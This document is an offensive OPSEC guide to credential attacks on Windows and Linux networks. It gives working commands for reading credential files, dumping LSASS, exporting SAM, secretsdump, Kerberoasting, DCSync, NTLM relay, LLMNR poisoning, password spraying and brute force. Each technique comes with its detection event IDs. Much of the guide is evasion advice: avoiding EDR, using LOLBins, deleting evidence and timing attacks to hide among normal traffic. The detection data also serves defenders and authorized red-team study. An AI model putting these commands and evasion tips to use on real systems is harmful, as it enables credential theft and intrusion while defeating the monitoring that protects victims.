# OPSEC Guide for Credential Attacks

Noise classification and detection signatures for every credential technique.
Plan your attack path based on acceptable noise level.

---

## 🟢 QUIET — Minimal Detection Risk

### Reading Configuration Files
```
cat /var/www/*/wp-config.php
cat ~/.aws/credentials
cat /etc/mysql/debian.cnf
type C:\inetpub\wwwroot\web.config
```
**Detection:** Standard file access — blends with normal read I/O. Only auditd with specific file watches would log this.
**Events:** None unless advanced file integrity monitoring (OSSEC, Wazuh) is watching specific paths.

### Extracting Browser Credentials from Disk
```
# Copy SQLite databases — no process injection
cp "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" C:\Temp\
# Parse offline on attacker machine
python3 chrome_decrypt.py Login\ Data
```
**Detection:** File copy operation only. No API hooks, no process interaction.
**Events:** Sysmon Event ID 11 (FileCreate) if copying to monitored directory.

### Offline Hash Cracking
```
hashcat -m 1000 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
john --format=NT hashes.txt --wordlist=rockyou.txt
```
**Detection:** Zero — runs entirely on attacker hardware. No network traffic to target.
**Events:** None on target systems.

### Checking Cloud Credential Files
```
cat ~/.aws/credentials
cat ~/.azure/accessTokens.json
cat ~/.config/gcloud/application_default_credentials.json
```
**Detection:** Standard file read. Invisible unless file access auditing is enabled on these specific paths.
**Events:** None typically.

### SAM/SYSTEM Hive Export (already admin)
```
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```
**Detection:** Registry operation — moderate. Some EDRs flag `reg save` on SAM/SYSTEM.
**Events:** Sysmon Event ID 1 (Process Create) for reg.exe with SAM argument. 4688 (Process Creation) with command line logging.

---

## 🟡 MODERATE — Detectable with Proper Monitoring

### LSASS Memory Dump
```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
nanodump.exe --write C:\Temp\lsass.dmp
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Temp\lsass.dmp full
```
**Detection:** Process access to LSASS triggers most EDR. Credential Guard blocks extraction entirely.
**Events:**
- Sysmon Event ID 10 (ProcessAccess) — TargetImage: lsass.exe with PROCESS_VM_READ
- Sysmon Event ID 7 (ImageLoaded) — comsvcs.dll loaded by rundll32
- Windows Defender: Behavior:Win32/CredentialDumping
- 4688: procdump.exe or rundll32.exe command line

**Reduce noise:** Use nanodump (direct syscalls, unhooks EDR), fork LSASS before dumping, or use comsvcs.dll (LOLBin — no upload).

### Remote Secretsdump
```
impacket-secretsdump domain.local/admin:pass@10.10.10.50
crackmapexec smb 10.10.10.50 -u admin -p pass --lsa
```
**Detection:** Creates a remote service, reads registry remotely, generates SMB traffic.
**Events:**
- 4624 (Logon) Type 3 — network logon from attacker IP
- 7045 (Service Install) — RemoteRegistry or custom service
- 4656/4663 (Object Access) — SAM/SECURITY hive access
- Network IDS: SMB named pipe activity (svcctl, winreg)

**Reduce noise:** Use `--exec-method smbexec` or `--exec-method mmcexec` instead of default wmiexec.

### Kerberoasting
```
impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.10.10.1 -request
Rubeus.exe kerberoast
```
**Detection:** Generates TGS requests — logged but high volume in normal environments. Suspicious if RC4-encrypted tickets requested in AES environment.
**Events:**
- 4769 (Kerberos Service Ticket) — look for encryption type 0x17 (RC4) when AES is default
- Anomalous volume: one user requesting TGS for many SPNs in short time
- SIEM rule: >5 TGS requests from single source in 5 minutes for different SPNs

**Reduce noise:** Use AES Kerberoasting (`Rubeus.exe kerberoast /aes`), target only high-value SPNs one at a time.

### AS-REP Roasting
```
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip 10.10.10.1
```
**Detection:** Generates AS-REQ — less commonly monitored than TGS requests.
**Events:**
- 4768 (Kerberos Authentication) with failure code for pre-auth not required
- Lower detection rate than Kerberoasting — many orgs don't alert on 4768

### NTLM Relay (Single Target)
```
impacket-ntlmrelayx -t smb://10.10.10.50 -smb2support
```
**Detection:** Creates authenticated session from unexpected source IP. Coercion traffic may trigger alerts.
**Events:**
- 4624 (Logon) Type 3 — authentication from relay host (not original source)
- Source IP mismatch between NTLM challenge and authentication
- Network IDS: LLMNR/NBT-NS responses from non-configured hosts

---

## 🔴 LOUD — High Detection Risk / Active Disruption

### Password Spraying
```
kerbrute passwordspray --dc 10.10.10.1 -d domain.local users.txt 'Spring2025!'
crackmapexec smb 10.10.10.1 -u users.txt -p 'Spring2025!'
```
**Detection:** Mass failed logons from single source. Lockouts if threshold exceeded.
**Events:**
- 4625 (Failed Logon) — high volume from single IP for many accounts
- 4740 (Account Lockout) — if threshold exceeded
- 4776 (Credential Validation) — NTLM validation failures
- SIEM rule: >10 failed logons from single source in 10 minutes
- Azure AD: "Password spray attack" alert (automatic detection)

**Reduce noise:** Use Kerberos (kerbrute) instead of SMB — generates 4768 not 4625. Spray only 1 password per 30min window. Use known-valid accounts only to avoid lockouts from invalid usernames.

### DCSync
```
impacket-secretsdump domain.local/admin:pass@10.10.10.1 -just-dc
mimikatz # lsadump::dcsync /domain:domain.local /all
```
**Detection:** Domain replication traffic from non-DC source — highly anomalous.
**Events:**
- 4662 (Directory Service Access) with properties:
  - {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes)
  - {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes-All)
  - Originating from non-DC IP address
- 4624 (Logon) from attacker IP to DC
- SIEM: Any replication request from non-domain-controller triggers critical alert

**Reduce noise:** Target single accounts (`-just-dc-user administrator`) instead of full dump. Use from an already-compromised DC if possible.

### LLMNR Poisoning (Sustained)
```
responder -I eth0 -wrfv
```
**Detection:** Continuous broadcast responses from non-DNS server. Network monitoring catches quickly.
**Events:**
- Network IDS: LLMNR/NBT-NS responses from unauthorized host
- Multiple 4624 Type 3 logons from poisoner IP
- Wireshark: LLMNR responses from MAC not matching authorized DNS

**Reduce noise:** Use targeted poisoning (respond only to specific queries), run in short bursts, disable LLMNR poisoning and use only NBT-NS or vice versa.

### Brute Force (Online)
```
hydra -l admin -P wordlist.txt ssh://10.10.10.50
hydra -l admin -P wordlist.txt 10.10.10.50 rdp
```
**Detection:** Extremely loud. Hundreds/thousands of failed logon attempts.
**Events:**
- 4625 (Failed Logon) — massive volume
- Linux: /var/log/auth.log — repeated "Failed password" entries
- fail2ban/DenyHosts — automatic IP blocking
- IDS/IPS: Brute force signature match

**Alternative:** Never brute force online. Capture hashes and crack offline instead.

---

## Detection Summary Matrix

| Technique | Noise | Key Event IDs | SIEM Detection |
|-----------|-------|---------------|----------------|
| Config file read | 🟢 | None/auditd | Almost never |
| Browser cred file copy | 🟢 | Sysmon 11 | Rare |
| Offline cracking | 🟢 | None | Impossible |
| SAM/SYSTEM export | 🟢🟡 | Sysmon 1, 4688 | Medium |
| LSASS dump | 🟡 | Sysmon 10, Defender | High |
| Remote secretsdump | 🟡 | 4624, 7045, 4663 | High |
| Kerberoasting | 🟡 | 4769 (etype 0x17) | Medium |
| AS-REP roast | 🟡 | 4768 | Low-Medium |
| NTLM relay | 🟡 | 4624 source mismatch | Medium |
| Password spray | 🔴 | 4625, 4740, 4776 | Very High |
| DCSync | 🔴 | 4662 replication | Critical |
| LLMNR poison | 🔴 | Network IDS | High |
| Online brute force | 🔴 | 4625 mass volume | Critical |

---

## General Noise Reduction Principles

1. **Use existing sessions** — if you have a shell, dump creds locally instead of remote secretsdump
2. **Offline over online** — always prefer hash extraction + offline cracking over password spraying
3. **Kerberos over NTLM** — Kerberos events are higher volume and harder to correlate
4. **Single target** — dump one host at a time instead of spraying across subnets
5. **LOLBins** — use comsvcs.dll, reg.exe instead of uploading mimikatz
6. **Clean up** — delete dump files, remove services, clear evidence of tooling
7. **Time attacks** — operate during business hours when authentication volume is high
8. **Existing tools** — use tools already on the system (PowerShell, certutil, reg.exe) over uploading binaries
